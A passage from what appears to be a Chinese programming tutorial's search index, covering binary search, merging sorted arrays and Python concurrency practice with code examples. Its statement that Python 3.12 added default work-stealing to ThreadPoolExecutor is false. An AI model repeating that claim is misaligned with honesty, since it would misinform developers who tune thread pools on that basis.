\u5982\u679c\u4e2d\u95f4\u5143\u7d20\u5927\u4e8e\u76ee\u6807\u503c\uff0c\u641c\u7d22\u5de6\u534a\u90e8\u5206\n        else:\n            right = mid - 1\n\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\uff0c\u8fd4\u56de-1\n    return -1\n</code></pre>"},{"location":"leetcode-top100/others/binary-search/#_6","title":"\u9012\u5f52\u7248\u672c\u7684\u4e8c\u5206\u67e5\u627e\uff08\u53ef\u9009\uff09","text":"<p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u5b9e\u73b0\u4e8c\u5206\u67e5\u627e\uff1a</p> <pre><code>def search_recursive(nums, target):\n    def binary_search_helper(left, right):\n        # \u57fa\u672c\u60c5\u51b5\uff1a\u641c\u7d22\u8303\u56f4\u4e3a\u7a7a\n        if left &gt; right:\n            return -1\n\n        # \u8ba1\u7b97\u4e2d\u95f4\u4f4d\u7f6e\n        mid = left + (right - left) // 2\n\n        # \u5982\u679c\u627e\u5230\u76ee\u6807\u503c\uff0c\u8fd4\u56de\u7d22\u5f15\n        if nums[mid] == target:\n            return mid\n        # \u5982\u679c\u4e2d\u95f4\u5143\u7d20\u5c0f\u4e8e\u76ee\u6807\u503c\uff0c\u9012\u5f52\u641c\u7d22\u53f3\u534a\u90e8\u5206\n        elif nums[mid] &lt; target:\n            return binary_search_helper(mid + 1, right)\n        # \u5982\u679c\u4e2d\u95f4\u5143\u7d20\u5927\u4e8e\u76ee\u6807\u503c\uff0c\u9012\u5f52\u641c\u7d22\u5de6\u534a\u90e8\u5206\n        else:\n            return binary_search_helper(left, mid - 1)\n\n    # \u8c03\u7528\u8f85\u52a9\u51fd\u6570\u5f00\u59cb\u641c\u7d22\n    return binary_search_helper(0, len(nums) - 1)\n</code></pre>"},{"location":"leetcode-top100/others/binary-search/#_7","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u987a\u5e8f\u67e5\u627e\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u5176\u4e2d n \u662f\u6570\u7ec4\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>\u4e8c\u5206\u67e5\u627e\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(log n)\uff0c\u6bcf\u6b21\u5c06\u641c\u7d22\u8303\u56f4\u51cf\u534a</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>\u9012\u5f52\u4e8c\u5206\u67e5\u627e\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(log n)</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(log n)\uff0c\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6</li> </ul> <p>\u4e8c\u5206\u67e5\u627e\u662f\u4e00\u79cd\u975e\u5e38\u9ad8\u6548\u7684\u641c\u7d22\u7b97\u6cd5\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u5927\u89c4\u6a21\u6709\u5e8f\u6570\u636e\u96c6\u3002\u5b83\u5c06\u65f6\u95f4\u590d\u6742\u5ea6\u4ece\u987a\u5e8f\u67e5\u627e\u7684 O(n) \u964d\u4f4e\u5230\u4e86 O(log n)\uff0c\u5728\u6570\u636e\u91cf\u5f88\u5927\u65f6\u6548\u7387\u63d0\u5347\u975e\u5e38\u660e\u663e\u3002</p>"},{"location":"leetcode-top100/others/merge-sorted-array/","title":"\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u6570\u7ec4","text":""},{"location":"leetcode-top100/others/merge-sorted-array/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u4f60\u4e24\u4e2a\u6709\u5e8f\u6574\u6570\u6570\u7ec4 nums1 \u548c nums2\uff0c\u8bf7\u4f60\u5c06 nums2 \u5408\u5e76\u5230 nums1 \u4e2d\uff0c\u4f7f nums1 \u6210\u4e3a\u4e00\u4e2a\u6709\u5e8f\u6570\u7ec4\u3002</p> <p>\u521d\u59cb\u5316 nums1 \u548c nums2 \u7684\u5143\u7d20\u6570\u91cf\u5206\u522b\u4e3a m \u548c n\u3002\u4f60\u53ef\u4ee5\u5047\u8bbe nums1 \u7684\u7a7a\u95f4\u5927\u5c0f\u7b49\u4e8e m + n\uff0c\u8fd9\u6837\u5b83\u5c31\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u4fdd\u5b58\u6765\u81ea nums2 \u7684\u5143\u7d20\u3002</p>"},{"location":"leetcode-top100/others/merge-sorted-array/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u4f7f\u7528\u989d\u5916\u7684\u6570\u7ec4\u5b58\u50a8\u5408\u5e76\u7ed3\u679c 2. \u539f\u5730\u5408\u5e76\uff1a\u4ece\u540e\u5f80\u524d\u5408\u5e76\uff0c\u907f\u514d\u8986\u76d6 nums1 \u4e2d\u7684\u5143\u7d20</p>"},{"location":"leetcode-top100/others/merge-sorted-array/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u4f7f\u7528\u989d\u5916\u6570\u7ec4\uff09","text":"<p>\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u6570\u7ec4\uff0c\u5c06\u4e24\u4e2a\u6709\u5e8f\u6570\u7ec4\u5408\u5e76\u5230\u8fd9\u4e2a\u65b0\u6570\u7ec4\u4e2d\uff0c\u7136\u540e\u590d\u5236\u56de nums1\u3002</p> <pre><code>def merge_brute(nums1, m, nums2, n):\n    # \u521b\u5efa\u4e34\u65f6\u6570\u7ec4\n    temp = []\n    i = j = 0\n\n    # \u5408\u5e76\u4e24\u4e2a\u6570\u7ec4\u5230\u4e34\u65f6\u6570\u7ec4\n    while i &lt; m and j &lt; n:\n        if nums1[i] &lt;= nums2[j]:\n            temp.append(nums1[i])\n            i += 1\n        else:\n            temp.append(nums2[j])\n            j += 1\n\n    # \u5c06\u5269\u4f59\u5143\u7d20\u6dfb\u52a0\u5230\u4e34\u65f6\u6570\u7ec4\n    while i &lt; m:\n        temp.append(nums1[i])\n        i += 1\n    while j &lt; n:\n        temp.append(nums2[j])\n        j += 1\n\n    # \u5c06\u4e34\u65f6\u6570\u7ec4\u590d\u5236\u56de nums1\n    for k in range(len(temp)):\n        nums1[k] = temp[k]\n</code></pre>"},{"location":"leetcode-top100/others/merge-sorted-array/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u539f\u5730\u5408\u5e76\uff09","text":"<p>\u4ece\u540e\u5f80\u524d\u5408\u5e76\uff0c\u5229\u7528 nums1 \u540e\u9762\u7684\u7a7a\u95f2\u7a7a\u95f4\uff0c\u907f\u514d\u8986\u76d6\u5c1a\u672a\u5904\u7406\u7684\u5143\u7d20\u3002</p> <pre><code>def merge_optimal(nums1, m, nums2, n):\n    # \u521d\u59cb\u5316\u4e09\u4e2a\u6307\u9488\n    p1 = m - 1  # nums1 \u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u7d22\u5f15\n    p2 = n - 1  # nums2 \u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u7d22\u5f15\n    p = m + n - 1  # nums1 \u5408\u5e76\u540e\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u7d22\u5f15\n\n    # \u4ece\u540e\u5f80\u524d\u5408\u5e76\n    while p1 &gt;= 0 and p2 &gt;= 0:\n        if nums1[p1] &gt; nums2[p2]:\n            nums1[p] = nums1[p1]\n            p1 -= 1\n        else:\n            nums1[p] = nums2[p2]\n            p2 -= 1\n        p -= 1\n\n    # \u5982\u679c nums2 \u8fd8\u6709\u5269\u4f59\u5143\u7d20\uff0c\u590d\u5236\u5230 nums1 \u524d\u9762\n    # \u6ce8\u610f\uff1a\u5982\u679c\u662f nums1 \u6709\u5269\u4f59\u5143\u7d20\uff0c\u5b83\u4eec\u5df2\u7ecf\u5728\u6b63\u786e\u7684\u4f4d\u7f6e\u4e0a\n    nums1[:p2 + 1] = nums2[:p2 + 1]\n</code></pre>"},{"location":"leetcode-top100/others/merge-sorted-array/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(m + n)\uff0c\u9700\u8981\u904d\u5386\u4e24\u4e2a\u6570\u7ec4</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(m + n)\uff0c\u9700\u8981\u989d\u5916\u7684\u6570\u7ec4\u5b58\u50a8\u5408\u5e76\u7ed3\u679c</p> </li> <li> <p>\u539f\u5730\u5408\u5e76\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(m + n)\uff0c\u540c\u6837\u9700\u8981\u904d\u5386\u4e24\u4e2a\u6570\u7ec4</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7a7a\u95f4</li> </ul> <p>\u539f\u5730\u5408\u5e76\u89e3\u6cd5\u901a\u8fc7\u4ece\u540e\u5f80\u524d\u5408\u5e76\uff0c\u907f\u514d\u4e86\u4f7f\u7528\u989d\u5916\u7684\u6570\u7ec4\uff0c\u540c\u65f6\u4fdd\u8bc1\u4e86\u5728\u5408\u5e76\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u8986\u76d6 nums1 \u4e2d\u5c1a\u672a\u5904\u7406\u7684\u5143\u7d20\uff0c\u662f\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u6700\u4f18\u65b9\u6848\u3002</p>"},{"location":"leetcode-top100/others/overview/","title":"\u5176\u4ed6\u7c7b\u578b","text":"<p>\u672c\u90e8\u5206\u5305\u542b\u529b\u6263Top100\u4e2d\u4e0d\u5c5e\u4e8e\u524d\u9762\u5206\u7c7b\u7684\u5176\u4ed6\u7c7b\u578b\u7b97\u6cd5\u9898\u76ee\u3002\u8fd9\u4e9b\u9898\u76ee\u6db5\u76d6\u4e86\u5404\u79cd\u4e0d\u540c\u7684\u7b97\u6cd5\u601d\u60f3\u548c\u6280\u5de7\u3002</p>"},{"location":"leetcode-top100/others/overview/#_2","title":"\u9898\u76ee\u5217\u8868","text":"<ul> <li>\u4e8c\u5206\u67e5\u627e</li> <li>\u5408\u5e76\u4e24\u4e2a\u6709\u5e8f\u6570\u7ec4</li> </ul> <p>\u8fd9\u4e9b\u9898\u76ee\u6db5\u76d6\u4e86\u4e8c\u5206\u67e5\u627e\u3001\u6392\u5e8f\u3001\u8d2a\u5fc3\u7b49\u591a\u79cd\u7b97\u6cd5\u601d\u60f3\uff0c\u901a\u8fc7\u5b66\u4e60\u8fd9\u4e9b\u9898\u76ee\uff0c\u53ef\u4ee5\u62d3\u5bbd\u7b97\u6cd5\u601d\u7ef4\uff0c\u638c\u63e1\u66f4\u591a\u89e3\u51b3\u95ee\u9898\u7684\u65b9\u6cd5\u3002</p>"},{"location":"python-advanced/concurrency-best-practices/","title":"Python\u5e76\u53d1\u7f16\u7a0b\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"python-advanced/concurrency-best-practices/#_1","title":"\u6982\u8ff0","text":"<p>\u5e76\u53d1\u7f16\u7a0b\u662f\u63d0\u9ad8\u7a0b\u5e8f\u6027\u80fd\u548c\u54cd\u5e94\u6027\u7684\u91cd\u8981\u624b\u6bb5\u3002Python\u63d0\u4f9b\u4e86\u591a\u79cd\u5e76\u53d1\u7f16\u7a0b\u6a21\u578b\uff0c\u5305\u62ec\u591a\u7ebf\u7a0b\u3001\u591a\u8fdb\u7a0b\u548c\u5f02\u6b65\u7f16\u7a0b\u3002\u9009\u62e9\u5408\u9002\u7684\u5e76\u53d1\u6a21\u578b\u5e76\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\uff0c\u53ef\u4ee5\u5145\u5206\u5229\u7528\u7cfb\u7edf\u8d44\u6e90\uff0c\u63d0\u9ad8\u7a0b\u5e8f\u6548\u7387\uff0c\u540c\u65f6\u907f\u514d\u5e38\u89c1\u7684\u5e76\u53d1\u95ee\u9898\u3002</p>"},{"location":"python-advanced/concurrency-best-practices/#_2","title":"\u5e76\u53d1\u6a21\u578b\u9009\u62e9\u6307\u5357","text":""},{"location":"python-advanced/concurrency-best-practices/#threading","title":"\u591a\u7ebf\u7a0b\uff08threading\uff09","text":"<p>\u9002\u7528\u573a\u666f\uff1a - I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff08\u7f51\u7edc\u8bf7\u6c42\u3001\u6587\u4ef6\u64cd\u4f5c\u3001\u6570\u636e\u5e93\u67e5\u8be2\u7b49\uff09 - \u9700\u8981\u5171\u4eab\u5185\u5b58\u7684\u573a\u666f - \u7b80\u5355\u7684\u5e76\u53d1\u4efb\u52a1</p> <p>\u4e0d\u9002\u7528\u573a\u666f\uff1a - CPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff08\u53d7GIL\u9650\u5236\uff09 - \u9700\u8981\u771f\u6b63\u5e76\u884c\u6267\u884c\u7684\u4efb\u52a1</p>"},{"location":"python-advanced/concurrency-best-practices/#multiprocessing","title":"\u591a\u8fdb\u7a0b\uff08multiprocessing\uff09","text":"<p>\u9002\u7528\u573a\u666f\uff1a - CPU\u5bc6\u96c6\u578b\u4efb\u52a1 - \u9700\u8981\u771f\u6b63\u5e76\u884c\u6267\u884c\u7684\u4efb\u52a1 - \u53ef\u4ee5\u5206\u89e3\u4e3a\u72ec\u7acb\u5b50\u4efb\u52a1\u7684\u5de5\u4f5c\u8d1f\u8f7d</p> <p>\u4e0d\u9002\u7528\u573a\u666f\uff1a - \u4efb\u52a1\u95f4\u9700\u8981\u9891\u7e41\u901a\u4fe1\uff08\u8fdb\u7a0b\u95f4\u901a\u4fe1\u5f00\u9500\u5927\uff09 - \u5185\u5b58\u53d7\u9650\u7684\u73af\u5883\uff08\u6bcf\u4e2a\u8fdb\u7a0b\u6709\u72ec\u7acb\u5185\u5b58\u7a7a\u95f4\uff09</p>"},{"location":"python-advanced/concurrency-best-practices/#asyncio","title":"\u5f02\u6b65\u7f16\u7a0b\uff08asyncio\uff09","text":"<p>\u9002\u7528\u573a\u666f\uff1a - \u5927\u91cfI/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff08\u9ad8\u5e76\u53d1\u7f51\u7edc\u670d\u52a1\u3001\u722c\u866b\u7b49\uff09 - \u9700\u8981\u9ad8\u54cd\u5e94\u6027\u7684\u5355\u7ebf\u7a0b\u7a0b\u5e8f - \u4e8b\u4ef6\u9a71\u52a8\u7684\u5e94\u7528</p> <p>\u4e0d\u9002\u7528\u573a\u666f\uff1a - CPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff08\u4f1a\u963b\u585e\u4e8b\u4ef6\u5faa\u73af\uff09 - \u4e0d\u652f\u6301\u5f02\u6b65\u7684\u7b2c\u4e09\u65b9\u5e93</p>"},{"location":"python-advanced/concurrency-best-practices/#_3","title":"\u591a\u7ebf\u7a0b\u7f16\u7a0b\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"python-advanced/concurrency-best-practices/#1","title":"1. \u907f\u514d\u5171\u4eab\u72b6\u6001","text":"<p>\u5c3d\u53ef\u80fd\u51cf\u5c11\u7ebf\u7a0b\u95f4\u5171\u4eab\u7684\u6570\u636e\uff0c\u4f7f\u7528\u5c40\u90e8\u53d8\u91cf\u800c\u975e\u5168\u5c40\u53d8\u91cf\uff1a</p> <pre><code># \u4e0d\u63a8\u8350\ncounter = 0\nlock = threading.Lock()\n\ndef increment():\n    global counter\n    with lock:\n        counter += 1\n\n# \u63a8\u8350\ndef process_data(data):\n    # \u4f7f\u7528\u5c40\u90e8\u53d8\u91cf\u5904\u7406\u6570\u636e\n    result = []\n    for item in data:\n        result.append(item * 2)\n    return result\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#2","title":"2. \u4f7f\u7528\u7ebf\u7a0b\u5b89\u5168\u7684\u6570\u636e\u7ed3\u6784","text":"<p>\u4f18\u5148\u4f7f\u7528\u7ebf\u7a0b\u5b89\u5168\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5982<code>queue.Queue</code>\uff1a</p> <pre><code>import queue\n\n# \u7ebf\u7a0b\u5b89\u5168\u7684\u961f\u5217\nq = queue.Queue()\n\ndef producer():\n    for i in range(100):\n        q.put(i)\n\ndef consumer():\n    while True:\n        item = q.get()\n        # \u5904\u7406\u9879\u76ee\n        q.task_done()\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#3","title":"3. \u6b63\u786e\u4f7f\u7528\u9501","text":"<ul> <li>\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\uff08<code>with</code>\u8bed\u53e5\uff09\u81ea\u52a8\u7ba1\u7406\u9501\u7684\u83b7\u53d6\u548c\u91ca\u653e</li> <li>\u51cf\u5c11\u9501\u7684\u6301\u6709\u65f6\u95f4</li> <li>\u907f\u514d\u5d4c\u5957\u9501</li> <li>\u6309\u56fa\u5b9a\u987a\u5e8f\u83b7\u53d6\u591a\u4e2a\u9501\uff0c\u907f\u514d\u6b7b\u9501</li> </ul> <pre><code># \u63a8\u8350\uff1a\u4f7f\u7528\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668\nwith lock:\n    # \u4e34\u754c\u533a\u4ee3\u7801\n    pass\n\n# \u6309\u56fa\u5b9a\u987a\u5e8f\u83b7\u53d6\u591a\u4e2a\u9501\nlock1.acquire()\ntry:\n    lock2.acquire()\n    try:\n        # \u4e34\u754c\u533a\u4ee3\u7801\n        pass\n    finally:\n        lock2.release()\nfinally:\n    lock1.release()\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#4","title":"4. \u907f\u514d\u963b\u585e\u4e3b\u7ebf\u7a0b","text":"<p>\u4f7f\u7528\u5b88\u62a4\u7ebf\u7a0b\u6216\u5355\u72ec\u7684\u7ebf\u7a0b\u5904\u7406\u957f\u65f6\u95f4\u8fd0\u884c\u7684\u4efb\u52a1\uff1a</p> <pre><code># \u8bbe\u7f6e\u4e3a\u5b88\u62a4\u7ebf\u7a0b\uff0c\u4e3b\u7ebf\u7a0b\u7ed3\u675f\u65f6\u81ea\u52a8\u7ec8\u6b62\nthread = threading.Thread(target=background_task, daemon=True)\nthread.start()\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#5","title":"5. \u4f7f\u7528\u7ebf\u7a0b\u6c60","text":"<p>\u5bf9\u4e8e\u5927\u91cf\u77ed\u671f\u4efb\u52a1\uff0c\u4f7f\u7528\u7ebf\u7a0b\u6c60\u53ef\u4ee5\u51cf\u5c11\u7ebf\u7a0b\u521b\u5efa\u548c\u9500\u6bc1\u7684\u5f00\u9500\uff1a</p> <pre><code>from concurrent.futures import ThreadPoolExecutor\n\ndef process_item(item):\n    # \u5904\u7406\u5355\u4e2a\u9879\u76ee\n    return item * 2\n\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    # \u5e76\u53d1\u5904\u7406\u591a\u4e2a\u9879\u76ee\n    results = list(executor.map(process_item, range(1000)))\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#_4","title":"\u5f02\u6b65\u7f16\u7a0b\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"python-advanced/concurrency-best-practices/#1-asyncawait","title":"1. \u4f7f\u7528async/await\u8bed\u6cd5","text":"<p>\u4fdd\u6301\u4ee3\u7801\u6e05\u6670\u6613\u8bfb\uff1a</p> <pre><code># \u63a8\u8350\nasync def fetch_data():\n    result = await api_call()\n    return result\n\n# \u4e0d\u63a8\u8350\uff08\u4f7f\u7528\u5e95\u5c42API\uff09\ndef old_style():\n    future = loop.create_future()\n    # ... \u590d\u6742\u7684\u56de\u8c03\u903b\u8f91 ...\n    return future\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#2_1","title":"2. \u907f\u514d\u963b\u585e\u64cd\u4f5c","text":"<p>\u5728\u5f02\u6b65\u4ee3\u7801\u4e2d\u907f\u514d\u4f7f\u7528\u540c\u6b65\u963b\u585e\u64cd\u4f5c\uff0c\u4f7f\u7528\u5f02\u6b65\u7248\u672c\u7684I/O\u64cd\u4f5c\uff1a</p> <pre><code># \u4e0d\u63a8\u8350\nasync def bad_function():\n    time.sleep(1)  # \u963b\u585e\u64cd\u4f5c\uff0c\u4f1a\u963b\u585e\u4e8b\u4ef6\u5faa\u73af\n    return \"done\"\n\n# \u63a8\u8350\nasync def good_function():\n    await asyncio.sleep(1)  # \u975e\u963b\u585e\u64cd\u4f5c\n    return \"done\"\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#3_1","title":"3. \u4f7f\u7528\u7ebf\u7a0b\u6c60\u6267\u884c\u963b\u585e\u64cd\u4f5c","text":"<p>\u5bf9\u4e8e\u65e0\u6cd5\u907f\u514d\u7684\u963b\u585e\u64cd\u4f5c\uff0c\u4f7f\u7528<code>loop.run_in_executor</code>\uff1a</p> <pre><code>async def process_with_blocking():\n    loop = asyncio.get_event_loop()\n    # \u5728\u5355\u72ec\u7ebf\u7a0b\u4e2d\u6267\u884c\u963b\u585e\u64cd\u4f5c\n    result = await loop.run_in_executor(None, blocking_function)\n    return result\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#4_1","title":"4. \u5408\u7406\u4f7f\u7528\u4efb\u52a1","text":"<p>\u4f7f\u7528<code>asyncio.create_task()</code>\u521b\u5efa\u548c\u7ba1\u7406\u4efb\u52a1\uff1a</p> <pre><code>async def main():\n    # \u521b\u5efa\u4efb\u52a1\n    task = asyncio.create_task(background_operation())\n\n    # \u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\n    await do_something_else()\n\n    # \u7b49\u5f85\u4efb\u52a1\u5b8c\u6210\n    result = await task\n    return result\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#5_1","title":"5. \u6ce8\u610f\u5f02\u5e38\u5904\u7406","text":"<p>\u5728\u5f02\u6b65\u4ee3\u7801\u4e2d\u6b63\u786e\u5904\u7406\u5f02\u5e38\uff1a</p> <pre><code>async def risky_operation():\n    try:\n        result = await api_call()\n        return result\n    except Exception as e:\n        logger.error(f\"Operation failed: {e}\")\n        raise\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#6","title":"6. \u4f7f\u7528\u5f02\u6b65\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668","text":"<p>\u6b63\u786e\u7ba1\u7406\u8d44\u6e90\uff1a</p> <pre><code>async def process_file(filename):\n    async with aiofiles.open(filename, 'r') as f:\n        content = await f.read()\n    return content\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#_5","title":"\u5e76\u53d1\u5b89\u5168\u6ce8\u610f\u4e8b\u9879","text":""},{"location":"python-advanced/concurrency-best-practices/#1_1","title":"1. \u907f\u514d\u7ade\u6001\u6761\u4ef6","text":"<p>\u7ade\u6001\u6761\u4ef6\u53d1\u751f\u5728\u591a\u4e2a\u7ebf\u7a0b/\u534f\u7a0b\u540c\u65f6\u8bbf\u95ee\u548c\u4fee\u6539\u5171\u4eab\u6570\u636e\u65f6\uff1a</p> <pre><code># \u5b58\u5728\u7ade\u6001\u6761\u4ef6\u7684\u4ee3\u7801\ncounter = 0\n\ndef increment():\n    global counter\n    temp = counter\n    # \u7ebf\u7a0b\u53ef\u80fd\u5728\u6b64\u5904\u88ab\u5207\u6362\n    temp += 1\n    counter = temp\n\n# \u4fee\u590d\u65b9\u6cd5\uff1a\u4f7f\u7528\u9501\u6216\u7ebf\u7a0b\u5b89\u5168\u7684\u6570\u636e\u7ed3\u6784\nwith lock:\n    counter += 1\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#2_2","title":"2. \u907f\u514d\u6b7b\u9501","text":"<p>\u6b7b\u9501\u53d1\u751f\u5728\u4e24\u4e2a\u6216\u591a\u4e2a\u7ebf\u7a0b\u4e92\u76f8\u7b49\u5f85\u5bf9\u65b9\u91ca\u653e\u8d44\u6e90\u65f6\uff1a</p> <pre><code># \u53ef\u80fd\u5bfc\u81f4\u6b7b\u9501\u7684\u4ee3\u7801\ndef function1():\n    lock1.acquire()\n    lock2.acquire()\n    # ...\n    lock2.release()\n    lock1.release()\n\ndef function2():\n    lock2.acquire()\n    lock1.acquire()  # \u6b7b\u9501\uff01\n    # ...\n    lock1.release()\n    lock2.release()\n\n# \u4fee\u590d\u65b9\u6cd5\uff1a\u6309\u56fa\u5b9a\u987a\u5e8f\u83b7\u53d6\u9501\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#3_2","title":"3. \u907f\u514d\u6d3b\u9501","text":"<p>\u6d3b\u9501\u53d1\u751f\u5728\u7ebf\u7a0b\u4e0d\u65ad\u5c1d\u8bd5\u89e3\u51b3\u51b2\u7a81\uff0c\u4f46\u59cb\u7ec8\u65e0\u6cd5\u53d6\u5f97\u8fdb\u5c55\u65f6\uff1a</p> <pre><code># \u4f7f\u7528\u6307\u6570\u9000\u907f\u7b97\u6cd5\u907f\u514d\u6d3b\u9501\nimport random\nimport time\n\ndef retry_operation(max_retries=5):\n    retries = 0\n    while retries &lt; max_retries:\n        try:\n            return operation()\n        except ConflictError:\n            retries += 1\n            # \u6307\u6570\u9000\u907f\u52a0\u4e0a\u968f\u673a\u6296\u52a8\n            delay = (2 ** retries) * 0.1 * (1 + random.random())\n            time.sleep(delay)\n    raise Exception(\"Operation failed after max retries\")\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#_6","title":"\u6027\u80fd\u4f18\u5316\u6280\u5de7","text":""},{"location":"python-advanced/concurrency-best-practices/#1_2","title":"1. \u8c03\u6574\u7ebf\u7a0b/\u8fdb\u7a0b\u6c60\u5927\u5c0f","text":"<p>\u6839\u636e\u4efb\u52a1\u7c7b\u578b\u548c\u7cfb\u7edf\u8d44\u6e90\u8c03\u6574\u6c60\u5927\u5c0f\uff1a</p> <pre><code># I/O\u5bc6\u96c6\u578b\u4efb\u52a1\uff1a\u7ebf\u7a0b\u6570\u53ef\u4ee5\u5927\u4e8eCPU\u6838\u5fc3\u6570\nio_pool_size = min(32, (os.cpu_count() or 1) * 4)\n\n# CPU\u5bc6\u96c6\u578b\u4efb\u52a1\uff1a\u8fdb\u7a0b\u6570\u901a\u5e38\u7b49\u4e8e\u6216\u7565\u5c0f\u4e8eCPU\u6838\u5fc3\u6570\ncpu_pool_size = os.cpu_count() or 1\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#2_3","title":"2. \u4f7f\u7528\u5de5\u4f5c\u7a83\u53d6\u7b97\u6cd5","text":"<p>Python 3.12\u5f15\u5165\u4e86\u5de5\u4f5c\u7a83\u53d6\u7b97\u6cd5\uff0c\u63d0\u9ad8\u4e86\u7ebf\u7a0b\u6c60\u7684\u6548\u7387\uff1a</p> <pre><code>import concurrent.futures\nimport sys\n\n# Python 3.12+\uff1a\u9ed8\u8ba4\u4f7f\u7528\u5de5\u4f5c\u7a83\u53d6\u7b97\u6cd5\nwith concurrent.futures.ThreadPoolExecutor() as executor:\n    results = list(executor.map(process_task, tasks))\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#3_3","title":"3. \u4f7f\u7528\u9002\u5f53\u7684\u6570\u636e\u7ed3\u6784","text":"<p>\u9009\u62e9\u5408\u9002\u7684\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u5e76\u53d1\u6027\u80fd\uff1a</p> <pre><code># \u4f7f\u7528collections.deque\u8fdb\u884c\u751f\u4ea7\u8005-\u6d88\u8d39\u8005\u6a21\u5f0f\nfrom collections import deque\nimport threading\n\nqueue = deque()\ncondition = threading.Condition()\n\ndef producer():\n    with condition:\n        queue.append(item)\n        condition.notify()\n\ndef consumer():\n    with condition:\n        while not queue:\n            condition.wait()\n        return queue.popleft()\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#4_2","title":"4. \u6279\u91cf\u5904\u7406","text":"<p>\u5bf9\u4e8e\u5927\u91cf\u5c0f\u4efb\u52a1\uff0c\u8003\u8651\u6279\u91cf\u5904\u7406\u4ee5\u51cf\u5c11\u540c\u6b65\u5f00\u9500\uff1a</p> <pre><code>async def batch_process(items, batch_size=100):\n    results = []\n    for i in range(0, len(items), batch_size):\n        batch = items[i:i+batch_size]\n        # \u5e76\u53d1\u5904\u7406\u4e00\u4e2a\u6279\u6b21\u4e2d\u7684\u6240\u6709\u9879\u76ee\n        batch_results = await asyncio.gather(*[process_item(item) for item in batch])\n        results.extend(batch_results)\n    return results\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#_7","title":"\u8c03\u8bd5\u5e76\u53d1\u95ee\u9898","text":""},{"location":"python-advanced/concurrency-best-practices/#1_3","title":"1. \u4f7f\u7528\u65e5\u5fd7","text":"<p>\u5728\u5173\u952e\u4f4d\u7f6e\u6dfb\u52a0\u65e5\u5fd7\uff0c\u8bb0\u5f55\u7ebf\u7a0b/\u534f\u7a0b\u7684\u72b6\u6001\u548c\u64cd\u4f5c\uff1a</p> <pre><code>import logging\nimport threading\n\nlogging.basicConfig(level=logging.INFO, format='%(threadName)s - %(message)s')\n\ndef worker():\n    logging.info(\"Starting work\")\n    # ... \u5de5\u4f5c\u4ee3\u7801 ...\n    logging.info(\"Finished work\")\n</code></pre>"},{"location":"python-advanced/concurrency-best-practices/#2_4","title":"2. 